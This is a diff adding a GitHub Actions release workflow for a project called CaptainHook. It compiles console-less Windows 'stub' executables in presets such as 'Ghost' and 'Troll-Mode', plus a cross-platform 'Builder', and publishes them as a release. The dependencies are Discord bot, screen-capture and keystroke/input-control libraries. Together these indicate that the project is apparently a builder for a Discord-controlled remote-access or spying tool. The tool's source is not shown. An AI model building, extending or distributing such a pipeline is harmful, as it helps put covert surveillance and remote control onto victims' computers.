@@ -1,0 +1,107 @@
+name: Release Binaries
+
+on:
+  push:
+    tags:
+      - 'v*'
+  workflow_dispatch:
+
+jobs:
+  build-stubs:
+    runs-on: windows-latest
+    strategy:
+      matrix:
+        preset: ["Full-Throttle", "Ghost", "The Tester", "Troll-Mode"]
+
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+          cache: 'pip'
+
+      - name: Install dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install pyinstaller discord.py aiohttp mss psutil pyautogui pynput ping3 rich
+
+      - name: Build Stub Binary
+        shell: bash
+        run: |
+          # Create staging
+          mkdir -p build_staging
+          cp -r src build_staging/
+          
+          # Preset selection logic (simplified for stub build)
+          # We build the stub with placeholders in Config.py
+          
+          pyinstaller --onefile --noconsole --name stub_${{ matrix.preset }} --paths=build_staging build_staging/src/client/main.py
+          
+          mkdir -p stubs
+          cp dist/stub_${{ matrix.preset }}.exe stubs/
+
+      - name: Upload Stub Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: stub-${{ matrix.preset }}
+          path: stubs/stub_${{ matrix.preset }}.exe
+
+  build-builder:
+    runs-on: ${{ matrix.os }}
+    strategy:
+      matrix:
+        os: [windows-latest, ubuntu-latest, macos-latest]
+
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Install dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install pyinstaller rich
+
+      - name: Build Standalone Builder
+        run: |
+          pyinstaller --onefile --name CaptainHookBuilder src/builder/main.py
+
+      - name: Upload Builder Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: builder-${{ matrix.os }}
+          path: dist/CaptainHookBuilder*
+
+  release:
+    needs: [build-stubs, build-builder]
+    runs-on: ubuntu-latest
+    if: startsWith(github.ref, 'refs/tags/')
+    steps:
+      - name: Download all artifacts
+        uses: actions/download-artifact@v4
+        with:
+          path: artifacts
+
+      - name: Organize Release Folder
+        run: |
+          mkdir release
+          mkdir release/stubs
+          cp artifacts/builder-windows-latest/CaptainHookBuilder.exe release/
+          cp artifacts/builder-ubuntu-latest/CaptainHookBuilder release/CaptainHookBuilder_linux
+          cp artifacts/builder-macos-latest/CaptainHookBuilder release/CaptainHookBuilder_mac
+          cp artifacts/stub-*/*.exe release/stubs/
+
+      - name: Create Release
+        uses: softprops/action-gh-release@v2
+        with:
+          files: |
+            release/CaptainHookBuilder.exe
+            release/CaptainHookBuilder_linux
+            release/CaptainHookBuilder_mac
+            release/stubs/*
+          body: "CaptainHook v3.1.0 Standalone Release. Includes pre-compiled Builder and Bot Stubs for instant generation."
